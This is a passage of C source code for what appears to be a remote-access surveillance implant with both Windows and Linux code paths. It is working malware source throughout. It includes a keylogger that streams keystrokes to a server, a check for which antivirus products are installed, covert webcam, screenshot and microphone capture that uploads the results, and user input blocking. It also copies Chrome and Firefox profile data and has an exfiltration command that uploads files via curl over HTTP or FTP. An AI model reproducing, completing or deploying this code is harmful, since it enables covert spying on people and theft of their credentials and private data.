        "/dev/input/event1", 
        "/dev/input/event2",
        "/dev/input/event3",
        "/dev/input/event4",
        NULL
    };
    
    for (int i = 0; devices[i] != NULL; i++) {
        keyboard_fd = open(devices[i], O_RDONLY | O_NONBLOCK);
        if (keyboard_fd != -1) {
            printf("Using input device: %s\n", devices[i]);
            break;
        }
    }
    
    if (keyboard_fd == -1) {
        printf("Could not find keyboard device. You may need to run as root.\n");
        return NULL;
    }
    
    struct input_event ev;
    int shift_pressed = 0;
    
    while (keylogger_active) {
        ssize_t n = read(keyboard_fd, &ev, sizeof(ev));
        if (n != sizeof(ev)) {
            usleep(10000); // 10ms delay
            continue;
        }
        
        // Only process key events and key presses
        if (ev.type == EV_KEY && ev.value == 1) {
            const char* key_name = get_linux_key_name(ev.code);
            
            // Handle shift key
            if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                shift_pressed = 1;
                if (keylog_file) {
                    fprintf(keylog_file, "[SHIFT]");
                    fflush(keylog_file);
                }
                
                // Send to server if connected
                if (connected_to_server) {
                    send_data_to_server("KEYLOG: [SHIFT]");
                }
            }
            // Handle other keys
            else if (key_name != NULL) {
                if (keylog_file) {
                    fprintf(keylog_file, "%s", key_name);
                    fflush(keylog_file);
                }
                
                // Send to server if connected
                if (connected_to_server) {
                    char keylog_msg[512];
                    snprintf(keylog_msg, sizeof(keylog_msg), "KEYLOG: %s", key_name);
                    send_data_to_server(keylog_msg);
                }
            }
        }
        // Handle shift release
        else if (ev.type == EV_KEY && ev.value == 0) {
            if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                shift_pressed = 0;
            }
        }
    }
    
    close(keyboard_fd);
    return NULL;
}
#endif

// Keylogger command
void keylogger(char **args) {
    if (args[0] && (strcmp(args[0], "stop") == 0 || strcmp(args[0], "off") == 0)) {
        if (keylogger_active) {
            keylogger_active = 0;
            
            if (keylog_file) {
                fclose(keylog_file);
                keylog_file = NULL;
            }
            
            printf("Keylogger stopped. Log saved to %s\n", keylog_filename);
        } else {
            printf("Keylogger is not running\n");
        }
        return;
    }
    
    if (keylogger_active) {
        printf("Keylogger is already running\n");
        return;
    }
    
    keylogger_active = 1;
    
    // Set log file path in output directory
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    snprintf(keylog_filename, sizeof(keylog_filename), "%s/keystrokes/keystrokes_%04d%02d%02d_%02d%02d%02d.log",
             output_dir,
             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
             t->tm_hour, t->tm_min, t->tm_sec);
    
    keylog_file = fopen(keylog_filename, "a");
    if (!keylog_file) {
        printf("Failed to open log file\n");
        keylogger_active = 0;
        return;
    }
    
    printf("Keylogger started. Logging to %s\n", keylog_filename);
    printf("Type 'keylog stop' to stop logging\n");
    
#ifdef _WIN32
    CreateThread(NULL, 0, windows_keylogger_thread, NULL, 0, NULL);
#else
    pthread_create(&keylogger_thread, NULL, linux_keylogger_thread, NULL);
#endif
}

// AV detection
void av_detection(char **args) {
    printf("\n[Anti-Virus Detection]\n");
    char output[4096];
    
    #ifdef _WIN32
        execute_command("wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName", output, sizeof(output));
        printf("Installed AV products:\n%s\n", output);
    #else
        printf("Checking for Linux security tools...\n");
        execute_command("ps aux | grep -E 'clam|rkhunter|chkrootkit'", output, sizeof(output));
        printf("Security processes:\n%s\n", output);
    #endif
}

// Firewall check
void firewall_check(char **args) {
    printf("\n[Firewall Status Check]\n");
    char output[4096];
    
    #ifdef _WIN32
        execute_command("netsh advfirewall show allprofiles", output, sizeof(output));
        printf("%s\n", output);
    #else
        execute_command("sudo ufw status", output, sizeof(output));
        printf("%s\n", output);
    #endif
}

// Get running processes
void get_processes(ProcessInfo *processes, int *count) {
    *count = 0;
    
    #ifdef _WIN32
        HANDLE hProcessSnap;
        PROCESSENTRY32 pe32;
        
        hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap == INVALID_HANDLE_VALUE) {
            return;
        }
        
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (!Process32First(hProcessSnap, &pe32)) {
            CloseHandle(hProcessSnap);
            return;
        }
        
        do {
            if (*count >= MAX_PROCESSES) break;
            
            processes[*count].pid = pe32.th32ProcessID;
            strncpy(processes[*count].name, pe32.szExeFile, sizeof(processes[*count].name)-1);
            
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
            if (hProcess != NULL) {
                char username[256];
                DWORD username_len = sizeof(username);
                
                if (GetUserName(username, &username_len)) {
                    strncpy(processes[*count].user, username, sizeof(processes[*count].user)-1);
                }
                
                CloseHandle(hProcess);
            }
            
            (*count)++;
        } while (Process32Next(hProcessSnap, &pe32));
        
        CloseHandle(hProcessSnap);
    #else
        DIR *dir;
        struct dirent *entry;
        
        if ((dir = opendir("/proc")) == NULL) {
            return;
        }
        
        while ((entry = readdir(dir)) != NULL) {
            if (*count >= MAX_PROCESSES) break;
            
            char *endptr;
            long pid = strtol(entry->d_name, &endptr, 10);
            if (*endptr != '\0') continue;
            
            char path[256];
            snprintf(path, sizeof(path), "/proc/%ld/status", pid);
            
            FILE *fp = fopen(path, "r");
            if (fp == NULL) continue;
            
            char line[256];
            char name[256] = "";
            char user[256] = "";
            
            while (fgets(line, sizeof(line), fp)) {
                if (strncmp(line, "Name:", 5) == 0) {
                    sscanf(line + 5, "%s", name);
                }
            }
            
            fclose(fp);
            
            struct stat st;
            if (stat(path, &st) == 0) {
                struct passwd *pw = getpwuid(st.st_uid);
                if (pw) {
                    strcpy(user, pw->pw_name);
                }
            }
            
            processes[*count].pid = pid;
            strncpy(processes[*count].name, name, sizeof(processes[*count].name)-1);
            strncpy(processes[*count].user, user, sizeof(processes[*count].user)-1);
            
            (*count)++;
        }
        
        closedir(dir);
    #endif
}

// Running processes
void running_processes(char **args) {
    printf("\n[Running Processes]\n");
    
    ProcessInfo processes[MAX_PROCESSES];
    int count;
    
    get_processes(processes, &count);
    
    for (int i = 0; i < count; i++) {
        printf("PID: %-6d | Name: %-20s | User: %s\n", 
               processes[i].pid, processes[i].name, processes[i].user);
    }
}

// WiFi scanner
void wifi_scanner(char **args) {
    printf("\n[WiFi Network Scanner]\n");
    char output[4096];
    
    #ifdef _WIN32
        execute_command("netsh wlan show networks mode=bssid", output, sizeof(output));
        printf("%s\n", output);
    #else
        printf("\nAvailable WiFi networks:\n");
        execute_command("nmcli dev wifi list", output, sizeof(output));
        printf("%s\n", output);
    #endif
}

// Background apps
void background_apps(char **args) {
    printf("\n[Background Applications]\n");
    char output[4096];
    
    #ifdef _WIN32
        execute_command("tasklist /v /fo LIST", output, sizeof(output));
        printf("%s\n", output);
    #else
        printf("\nRunning processes:\n");
        execute_command("ps aux", output, sizeof(output));
        printf("%s\n", output);
    #endif
}

// Webcam access - FIXED to send to server
void webcam_access(char **args) {
    printf("\n[Webcam Access]\n");
    
#ifdef _WIN32
    printf("Windows webcam capture requires additional libraries\n");
    printf("Consider using OpenCV or similar library for Windows\n");
#else
    if (system("which fswebcam > /dev/null 2>&1") != 0) {
        printf("Error: fswebcam not found. Install with:\n");
        printf("sudo apt-get install fswebcam\n");
        return;
    }

    // Capture to memory instead of file
    printf("Capturing image from webcam...\n");
    
    // Use temporary file first
    char temp_path[MAX_PATH_LENGTH];
    snprintf(temp_path, sizeof(temp_path), "/tmp/webcam_%ld.jpg", time(NULL));
    
    char cmd[MAX_COMMAND_LENGTH * 2];
    snprintf(cmd, sizeof(cmd), "fswebcam -r 1280x720 --no-banner %s 2>/dev/null", temp_path);
    
    int result = system(cmd);
    
    if (result == 0) {
        // Read file into memory
        FILE *fp = fopen(temp_path, "rb");
        if (fp) {
            fseek(fp, 0, SEEK_END);
            long file_size = ftell(fp);
            fseek(fp, 0, SEEK_SET);
            
            unsigned char *buffer = (unsigned char *)malloc(file_size);
            if (buffer) {
                size_t bytes_read = fread(buffer, 1, file_size, fp);
                fclose(fp);
                
                if (bytes_read == file_size) {
                    // Generate filename
                    char filename[MAX_PATH_LENGTH];
                    time_t now = time(NULL);
                    struct tm *t = localtime(&now);
                    snprintf(filename, sizeof(filename), "webcam_%04d%02d%02d_%02d%02d%02d.jpg",
                             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                             t->tm_hour, t->tm_min, t->tm_sec);
                    
                    // Send to server if connected
                    if (connected_to_server) {
                        send_file_to_server(filename, buffer, file_size);
                        printf("Webcam image captured and sent to server: %s (%ld bytes)\n", 
                               filename, file_size);
                    } else {
                        // Save locally if not connected
                        char local_path[MAX_PATH_LENGTH];
                        snprintf(local_path, sizeof(local_path), "%s/captures/%s", 
                                output_dir, filename);
                        FILE *out_fp = fopen(local_path, "wb");
                        if (out_fp) {
                            fwrite(buffer, 1, file_size, out_fp);
                            fclose(out_fp);
                            printf("Webcam image saved locally: %s\n", local_path);
                        }
                    }
                    
                    free(buffer);
                } else {
                    fclose(fp);
                    printf("Failed to read webcam image\n");
                }
            } else {
                fclose(fp);
                printf("Failed to allocate memory for webcam image\n");
            }
        } else {
            printf("Failed to read captured image\n");
        }
        
        // Clean up temporary file
        remove(temp_path);
    } else {
        printf("Failed to capture webcam image. Error code: %d\n", result);
        printf("Make sure a webcam is connected and accessible\n");
    }
#endif
}

// Screenshot - FIXED with better error handling
void capture_screenshot_to_memory(unsigned char **buffer, size_t *size) {
    *buffer = NULL;
    *size = 0;
    
#ifdef _WIN32
    // Check if we're in a service/background context
    DWORD sessionId = WTSGetActiveConsoleSessionId();
    if (sessionId == 0xFFFFFFFF || sessionId == 0) {
        // No active console session
        return;
    }
    
    // Check if desktop is available
    HDESK hDesk = OpenInputDesktop(0, FALSE, DESKTOP_READOBJECTS);
    if (!hDesk) {
        // Desktop not accessible
        return;
    }
    CloseDesktop(hDesk);
    
    // Get the entire virtual screen dimensions
    int virtualScreenWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int virtualScreenHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int virtualScreenLeft = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int virtualScreenTop = GetSystemMetrics(SM_YVIRTUALSCREEN);
    
    if (virtualScreenWidth <= 0 || virtualScreenHeight <= 0) {
        return;
    }
    
    HDC hdcScreen = CreateDC("DISPLAY", NULL, NULL, NULL);
    if (!hdcScreen) {
        return;
    }
    
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    if (!hdcMem) {
        DeleteDC(hdcScreen);
        return;
    }
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, virtualScreenWidth, virtualScreenHeight);
    if (!hBitmap) {
        DeleteDC(hdcMem);
        DeleteDC(hdcScreen);
        return;
    }
    
    HGDIOBJ oldBitmap = SelectObject(hdcMem, hBitmap);
    
    // Capture the entire virtual screen
    if (!BitBlt(hdcMem, 0, 0, virtualScreenWidth, virtualScreenHeight, 
                hdcScreen, virtualScreenLeft, virtualScreenTop, SRCCOPY)) {
        SelectObject(hdcMem, oldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        DeleteDC(hdcScreen);
        return;
    }
    
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;
    
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = virtualScreenWidth;
    bi.biHeight = virtualScreenHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;
    
    DWORD dwBmpSize = ((virtualScreenWidth * bi.biBitCount + 31) / 32) * 4 * virtualScreenHeight;
    
    unsigned char *bmpData = (unsigned char *)malloc(dwBmpSize);
    if (!bmpData) {
        SelectObject(hdcMem, oldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        DeleteDC(hdcScreen);
        return;
    }
    
    if (!GetDIBits(hdcScreen, hBitmap, 0, virtualScreenHeight, bmpData, (BITMAPINFO *)&bi, DIB_RGB_COLORS)) {
        free(bmpData);
        SelectObject(hdcMem, oldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        DeleteDC(hdcScreen);
        return;
    }
    
    *size = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    *buffer = (unsigned char *)malloc(*size);
    
    if (*buffer) {
        bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        bmfHeader.bfSize = *size;
        bmfHeader.bfType = 0x4D42;
        
        memcpy(*buffer, &bmfHeader, sizeof(BITMAPFILEHEADER));
        memcpy(*buffer + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
        memcpy(*buffer + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), bmpData, dwBmpSize);
    } else {
        *size = 0;
    }
    
    free(bmpData);
    SelectObject(hdcMem, oldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    DeleteDC(hdcScreen);
    
#else
    // Linux - check if DISPLAY is set
    char *display = getenv("DISPLAY");
    if (display == NULL || strlen(display) == 0) {
        // Try to set DISPLAY
        setenv("DISPLAY", ":0", 0);
        display = getenv("DISPLAY");
        if (display == NULL) {
            return;
        }
    }
    
    char temp_path[MAX_PATH_LENGTH];
    snprintf(temp_path, sizeof(temp_path), "/tmp/screenshot_%ld.png", time(NULL));
    
    // Try multiple screenshot methods in order of preference
    const char *methods[] = {
        // Method 1: scrot (fast and reliable)
        "scrot '%s' 2>/dev/null",
        
        // Method 2: gnome-screenshot (works on GNOME desktops)
        "gnome-screenshot -f '%s' 2>/dev/null",
        
        // Method 3: import from ImageMagick
        "import -window root '%s' 2>/dev/null",
        
        // Method 4: maim (modern screenshot tool)
        "maim '%s' 2>/dev/null",
        
        // Method 5: xwd + convert (fallback)
        "xwd -root -silent 2>/dev/null | convert xwd:- '%s' 2>/dev/null",
        
        NULL
    };
    
    int success = 0;
    for (int i = 0; methods[i] != NULL && !success; i++) {
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), methods[i], temp_path);
        
        if (system(cmd) == 0) {
            // Check if file was created and has content
            FILE *fp = fopen(temp_path, "rb");
            if (fp) {
                fseek(fp, 0, SEEK_END);
                long fsize = ftell(fp);
                
                if (fsize > 0) {
                    fseek(fp, 0, SEEK_SET);
                    *buffer = (unsigned char *)malloc(fsize);
                    
                    if (*buffer) {
                        *size = fread(*buffer, 1, fsize, fp);
                        if (*size == fsize) {
                            success = 1;
                        } else {
                            free(*buffer);
                            *buffer = NULL;
                            *size = 0;
                        }
                    }
                }
                fclose(fp);
            }
        }
        
        // Clean up temp file if method failed
        if (!success) {
            remove(temp_path);
        }
    }
    
    // Clean up temp file after successful read
    if (success) {
        remove(temp_path);
    }
#endif
}

// Take screenshot with better error messages
void take_screenshot(char **args) {
    printf("\n[Screenshot Capture]\n");
    
#ifdef _WIN32
    // Check if we're running in a service context (session 0)
    DWORD sessionId = WTSGetActiveConsoleSessionId();
    if (sessionId == 0xFFFFFFFF || sessionId == 0) {
        printf("Cannot take screenshot: No active desktop session\n");
        if (connected_to_server) {
            send_data_to_server("ERROR: Cannot take screenshot - no active desktop session\n");
            send_data_to_server("Please make sure a user is logged in to the Windows desktop.\n");
        }
        return;
    }
    
    // Check if desktop is available
    HDESK hDesk = OpenInputDesktop(0, FALSE, DESKTOP_READOBJECTS);
    if (!hDesk) {
        printf("Cannot take screenshot: Desktop not accessible\n");
        if (connected_to_server) {
            send_data_to_server("ERROR: Cannot take screenshot - desktop locked or unavailable\n");
        }
        return;
    }
    CloseDesktop(hDesk);
#else
    // Check if DISPLAY is set
    char *display = getenv("DISPLAY");
    if (display == NULL || strlen(display) == 0) {
        printf("Cannot take screenshot: No DISPLAY environment variable\n");
        if (connected_to_server) {
            send_data_to_server("ERROR: Cannot take screenshot - no X11 display available\n");
            send_data_to_server("Make sure you're running on a system with a desktop environment.\n");
        }
        return;
    }
#endif
    
    printf("Capturing screenshot...\n");
    unsigned char *buffer = NULL;
    size_t size = 0;
    
    capture_screenshot_to_memory(&buffer, &size);
    
    if (buffer && size > 0) {
        char filename[MAX_PATH_LENGTH];
        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        snprintf(filename, sizeof(filename), "screenshot_%04d%02d%02d_%02d%02d%02d.%s",
                 t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                 t->tm_hour, t->tm_min, t->tm_sec,
#ifdef _WIN32
                 "bmp"
#else
                 "png"
#endif
                );
        
        if (connected_to_server) {
            send_file_to_server(filename, buffer, size);
            printf("Screenshot captured and sent to server: %s (%zu bytes)\n", filename, size);
            
            char success_msg[256];
            snprintf(success_msg, sizeof(success_msg), 
                    "Screenshot captured successfully: %s (%zu bytes)\n", filename, size);
            send_data_to_server(success_msg);
        } else {
            // Save locally if not connected
            char local_path[MAX_PATH_LENGTH];
            snprintf(local_path, sizeof(local_path), "%s/screenshots/%s", output_dir, filename);
            FILE *fp = fopen(local_path, "wb");
            if (fp) {
                fwrite(buffer, 1, size, fp);
                fclose(fp);
                printf("Screenshot saved locally: %s\n", local_path);
            }
        }
        
        free(buffer);
    } else {
        printf("Failed to capture screenshot\n");
        if (connected_to_server) {
#ifdef _WIN32
            send_data_to_server("ERROR: Failed to capture screenshot - GDI error\n");
#else
            send_data_to_server("ERROR: Failed to capture screenshot\n");
            send_data_to_server("Please install one of these tools:\n");
            send_data_to_server("  sudo apt-get install scrot\n");
            send_data_to_server("  sudo apt-get install gnome-screenshot\n");
            send_data_to_server("  sudo apt-get install imagemagick\n");
            send_data_to_server("  sudo apt-get install maim\n");
#endif
        }
    }
}

// Audio recording for Windows
#ifdef _WIN32
void record_audio_to_memory(unsigned char **buffer, size_t *size, int duration) {
    HWAVEIN hWaveIn;
    WAVEFORMATEX waveFormat;
    WAVEHDR waveHeader;
    MMRESULT result;

    // Set up the wave format
    waveFormat.wFormatTag = WAVE_FORMAT_PCM;
    waveFormat.nChannels = 1; // Mono
    waveFormat.nSamplesPerSec = 44100;
    waveFormat.wBitsPerSample = 16;
    waveFormat.nBlockAlign = (waveFormat.nChannels * waveFormat.wBitsPerSample) / 8;
    waveFormat.nAvgBytesPerSec = waveFormat.nSamplesPerSec * waveFormat.nBlockAlign;
    waveFormat.cbSize = 0;

    // Calculate buffer size
    *size = waveFormat.nAvgBytesPerSec * duration;
    *buffer = (unsigned char *)malloc(*size);
    if (!*buffer) {
        printf("Error: Memory allocation failed\n");
        return;
    }

    // Open the wave input device
    result = waveInOpen(&hWaveIn, WAVE_MAPPER, &waveFormat, 0, 0, CALLBACK_NULL);
    if (result != MMSYSERR_NOERROR) {
        printf("Error: Failed to open wave input device\n");
        free(*buffer);
        *buffer = NULL;
        *size = 0;
        return;
    }

    // Prepare the wave header
    waveHeader.lpData = (LPSTR)*buffer;
    waveHeader.dwBufferLength = *size;
    waveHeader.dwFlags = 0;
    result = waveInPrepareHeader(hWaveIn, &waveHeader, sizeof(WAVEHDR));
    if (result != MMSYSERR_NOERROR) {
        printf("Error: Failed to prepare wave header\n");
        waveInClose(hWaveIn);
        free(*buffer);
        *buffer = NULL;
        *size = 0;
        return;
    }

    // Start recording
    result = waveInAddBuffer(hWaveIn, &waveHeader, sizeof(WAVEHDR));
    if (result != MMSYSERR_NOERROR) {
        printf("Error: Failed to add buffer\n");
        waveInUnprepareHeader(hWaveIn, &waveHeader, sizeof(WAVEHDR));
        waveInClose(hWaveIn);
        free(*buffer);
        *buffer = NULL;
        *size = 0;
        return;
    }

    result = waveInStart(hWaveIn);
    if (result != MMSYSERR_NOERROR) {
        printf("Error: Failed to start recording\n");
        waveInUnprepareHeader(hWaveIn, &waveHeader, sizeof(WAVEHDR));
        waveInClose(hWaveIn);
        free(*buffer);
        *buffer = NULL;
        *size = 0;
        return;
    }

    printf("Recording audio for %d seconds...\n", duration);
    printf("Speak into your microphone now...\n");

    // Wait for the specified duration
    Sleep(duration * 1000);

    // Stop recording
    waveInStop(hWaveIn);
    waveInReset(hWaveIn);

    // Unprepare the header and close the device
    waveInUnprepareHeader(hWaveIn, &waveHeader, sizeof(WAVEHDR));
    waveInClose(hWaveIn);

    // The actual recorded data might be less than the buffer size
    // We can adjust the size to the actual recorded bytes
    *size = waveHeader.dwBytesRecorded;
}
#endif

// Audio recording - ensure it handles longer durations
void send_audio_to_server(int duration) {
    unsigned char *buffer = NULL;
    size_t size = 0;

#ifdef _WIN32
    record_audio_to_memory(&buffer, &size, duration);
#else
    // For Linux, use popen to record audio to memory
    char cmd[MAX_COMMAND_LENGTH];
    snprintf(cmd, sizeof(cmd), "arecord -f cd -d %d -t wav - 2>/dev/null", duration);
    
    FILE *pipe = popen(cmd, "r");
    if (pipe) {
        size_t capacity = 4096;
        buffer = (unsigned char *)malloc(capacity);
        size = 0;

        if (buffer) {
            size_t nread;
            unsigned char chunk[4096];
            
            // Read in chunks to handle large recordings
            while ((nread = fread(chunk, 1, sizeof(chunk), pipe)) > 0) {
                // Expand buffer if needed
                while (size + nread > capacity) {
                    capacity *= 2;
                    unsigned char *new_buffer = (unsigned char *)realloc(buffer, capacity);
                    if (!new_buffer) {
                        free(buffer);
                        buffer = NULL;
                        size = 0;
                        pclose(pipe);
                        return;
                    }
                    buffer = new_buffer;
                }
                
                memcpy(buffer + size, chunk, nread);
                size += nread;
            }
        }
        pclose(pipe);
    }
#endif

    if (buffer && size > 0) {
        char filename[MAX_PATH_LENGTH];
        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        snprintf(filename, sizeof(filename), "recording_%04d%02d%02d_%02d%02d%02d.wav",
                 t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                 t->tm_hour, t->tm_min, t->tm_sec);

        if (connected_to_server) {
            send_file_to_server(filename, buffer, size);
            printf("Audio recording sent to server: %s (%zu bytes)\n", filename, size);
            
            char success_msg[256];
            snprintf(success_msg, sizeof(success_msg), 
                    "Audio recording completed: %s (%zu bytes, %d seconds)\n", 
                    filename, size, duration);
            send_data_to_server(success_msg);
        } else {
            // Save locally if not connected
            char local_path[MAX_PATH_LENGTH];
            snprintf(local_path, sizeof(local_path), "%s/audio/%s", output_dir, filename);
            FILE *fp = fopen(local_path, "wb");
            if (fp) {
                fwrite(buffer, 1, size, fp);
                fclose(fp);
                printf("Audio recording saved locally: %s\n", local_path);
            }
        }
        
        free(buffer);
    } else {
        printf("Failed to record audio\n");
        if (connected_to_server) {
            send_data_to_server("ERROR: Failed to record audio\n");
#ifndef _WIN32
            send_data_to_server("Make sure alsa-utils is installed: sudo apt-get install alsa-utils\n");
#endif
        }
    }
}

// Audio recording
void record_audio(char **args) {
    printf("\n[Audio Recording]\n");
    
    int duration = 10;
    if (args[0] != NULL) {
        duration = atoi(args[0]);
        if (duration <= 0) duration = 10;
    }

    send_audio_to_server(duration);
}

// Input blocking
void block_input_impl(int block) {
    #ifdef _WIN32
        if (block) {
            BlockInput(TRUE);
        } else {
            BlockInput(FALSE);
        }
    #else
        printf("Linux input blocking requires root privileges\n");
    #endif
}

void block_input(char **args) {
    printf("\n[Input Blocker]\n");
    
    if (args[0] != NULL && (strcmp(args[0], "off") == 0 || strcmp(args[0], "0") == 0)) {
        input_blocked = 0;
        block_input_impl(0);
        printf("Input unblocked\n");
        return;
    }
    
    input_blocked = 1;
    block_input_impl(1);
    printf("Input blocked. Use 'block off' to unblock.\n");
}

// Terminate process
void terminate_process(char **args) {
    if (args[0] == NULL) {
        printf("Usage: kill <pid|name>\n");
        return;
    }
    
    printf("\n[Process Termination]\n");
    
    char *endptr;
    long pid = strtol(args[0], &endptr, 10);
    
    if (*endptr == '\0') {
        // Argument is a PID
        #ifdef _WIN32
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, (DWORD)pid);
            if (hProcess == NULL) {
                printf("Failed to open process %ld\n", pid);
                return;
            }
            
            if (TerminateProcess(hProcess, 0)) {
                printf("Successfully terminated process %ld\n", pid);
            } else {
                printf("Failed to terminate process %ld\n", pid);
            }
            
            CloseHandle(hProcess);
        #else
            if (kill(pid, SIGTERM) == 0) {
                printf("Successfully terminated process %ld\n", pid);
            } else {
                printf("Failed to terminate process %ld\n", pid);
            }
        #endif
    } else {
        // Argument is a process name
        ProcessInfo processes[MAX_PROCESSES];
        int count;
        
        get_processes(processes, &count);
        
        int terminated = 0;
        for (int i = 0; i < count; i++) {
            if (strstr(processes[i].name, args[0])) {
                #ifdef _WIN32
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processes[i].pid);
                    if (hProcess != NULL) {
                        if (TerminateProcess(hProcess, 0)) {
                            printf("Terminated %s (PID: %d)\n", processes[i].name, processes[i].pid);
                            terminated++;
                        }
                        CloseHandle(hProcess);
                    }
                #else
                    if (kill(processes[i].pid, SIGTERM) == 0) {
                        printf("Terminated %s (PID: %d)\n", processes[i].name, processes[i].pid);
                        terminated++;
                    }
                #endif
            }
        }
        
        if (terminated > 0) {
            printf("Terminated %d processes\n", terminated);
        } else {
            printf("No processes found matching '%s'\n", args[0]);
        }
    }
}

// Browser data extraction
void extract_browser_data(char **args) {
    printf("\n[Browser Data Extraction]\n");
    
    char browser_output_dir[MAX_PATH_LENGTH];
    snprintf(browser_output_dir, sizeof(browser_output_dir), "%s/browser_data", output_dir);
    
    #ifdef _WIN32
        printf("Extracting browser data (Windows)\n");
        
        // Chrome
        char chrome_path[MAX_PATH_LENGTH];
        snprintf(chrome_path, sizeof(chrome_path), "%s\\AppData\\Local\\Google\\Chrome\\User Data",
                 getenv("USERPROFILE"));
        
        if (CreateDirectory(browser_output_dir, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
            char cmd[MAX_COMMAND_LENGTH];
            snprintf(cmd, sizeof(cmd), "xcopy \"%s\\Default\\*\" %s\\chrome /E /I /H", 
                     chrome_path, browser_output_dir);
            system(cmd);
            printf("Chrome data extracted to %s/chrome\n", browser_output_dir);
        }
        
        // Firefox
        char firefox_path[MAX_PATH_LENGTH];
        snprintf(firefox_path, sizeof(firefox_path), "%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
                 getenv("USERPROFILE"));
        
        WIN32_FIND_DATA findData;
        HANDLE hFind = FindFirstFile(firefox_path, &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            char cmd[MAX_COMMAND_LENGTH];
            snprintf(cmd, sizeof(cmd), "xcopy \"%s\\%s\\*\" %s\\firefox /E /I /H", 
                     firefox_path, findData.cFileName, browser_output_dir);
            system(cmd);
            printf("Firefox data extracted to %s/firefox\n", browser_output_dir);
            FindClose(hFind);
        }
    #else
        printf("\nExtracting browser data (Linux)\n");
        
        // Chrome
        if (mkdir(browser_output_dir, 0755) == 0 || errno == EEXIST) {
            char cmd[MAX_COMMAND_LENGTH];
            snprintf(cmd, sizeof(cmd), "cp -r ~/.config/google-chrome/Default %s/chrome", browser_output_dir);
            system(cmd);
            printf("Chrome data extracted to %s/chrome\n", browser_output_dir);
        }
        
        // Firefox
        char firefox_path[MAX_PATH_LENGTH];
        snprintf(firefox_path, sizeof(firefox_path), "~/.mozilla/firefox/*.default");
        
        DIR *dir = opendir(firefox_path);
        if (dir) {
            char cmd[MAX_COMMAND_LENGTH];
            snprintf(cmd, sizeof(cmd), "cp -r %s %s/firefox", firefox_path, browser_output_dir);
            system(cmd);
            printf("Firefox data extracted to %s/firefox\n", browser_output_dir);
            closedir(dir);
        }
    #endif
    
    printf("Browser data extracted to %s\n", browser_output_dir);
}

// Data exfiltration
void exfiltrate_data(char **args) {
    printf("\n[Data Exfiltration]\n");
    
    if (args[0] == NULL || args[1] == NULL) {
        printf("Usage: exfil <http|ftp> <target> [data]\n");
        return;
    }
    
    const char *data = args[2] ? args[2] : "collected_data.zip";
    
    if (strcmp(args[0], "http") == 0) {
        printf("Exfiltrating data via HTTP to %s\n", args[1]);
        char cmd[MAX_COMMAND_LENGTH * 2];
        snprintf(cmd, sizeof(cmd), "curl -F \"file=@%s\" %s", data, args[1]);
        system(cmd);
    } else if (strcmp(args[0], "ftp") == 0) {
        printf("Exfiltrating data via FTP to %s\n", args[1]);
        char cmd[MAX_COMMAND_LENGTH * 2];
        snprintf(cmd, sizeof(cmd), "curl -T %s ftp://%s", data, args[1]);
        system(cmd);
    } else {
        printf("Unknown exfiltration method: %s\n", args[0]);
    }
}

// Get network connections
void get_network_connections(NetworkConn *connections, int *count) {
    *count = 0;
    
    #ifdef _WIN32
        PMIB_TCPTABLE_OWNER_PID pTcpTable;
        DWORD dwSize = 0;
        DWORD dwRetVal = 0;
        
        GetExtendedTcpTable(NULL, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
        pTcpTable = (MIB_TCPTABLE_OWNER_PID*)malloc(dwSize);
        
        if ((dwRetVal = GetExtendedTcpTable(pTcpTable, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0)) != NO_ERROR) {
            free(pTcpTable);
            return;
        }
        
        for (DWORD i = 0; i < pTcpTable->dwNumEntries; i++) {
            if (*count >= MAX_NETWORK_CONNS) break;
            
            connections[*count].pid = pTcpTable->table[i].dwOwningPid;
            
            // Local address
            struct in_addr localAddr;
            localAddr.S_un.S_addr = pTcpTable->table[i].dwLocalAddr;
            strcpy(connections[*count].local_addr, inet_ntoa(localAddr));
            connections[*count].local_port = ntohs((u_short)pTcpTable->table[i].dwLocalPort);
            
            // Remote address
            struct in_addr remoteAddr;
